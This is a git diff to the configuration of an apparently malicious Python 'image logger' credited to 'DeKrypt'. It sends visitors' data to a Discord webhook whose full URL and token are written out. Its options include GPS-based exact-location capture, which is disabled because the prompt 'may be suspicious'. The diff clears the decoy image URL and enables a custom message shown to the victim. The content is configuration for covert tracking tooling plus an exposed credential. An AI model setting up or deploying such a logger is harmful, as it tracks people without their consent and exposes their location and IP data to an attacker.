@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1443497313824800990/vLWm6-6Va55J_3GlRBFSmO7tWAajFpRT7wj4zQ07q55W16dP8BtfrdTDhcNVjgQPmw1p",
-    "image": "https://i.imgflip.com/7q9knu.jpg", # You can also have a custom image by using a URL argument
+    "image": "", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -27,7 +27,7 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
+        "doMessage": True, # Enable the custom message?
         "message": "𝑰𝑪𝑯 𝑾𝑬𝑰𝑺 𝑫𝑨𝑺 𝑫𝑼 𝑨𝑼𝑭 𝑴𝑰𝑨 𝑮𝑶𝑶𝑵𝑺𝑻", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
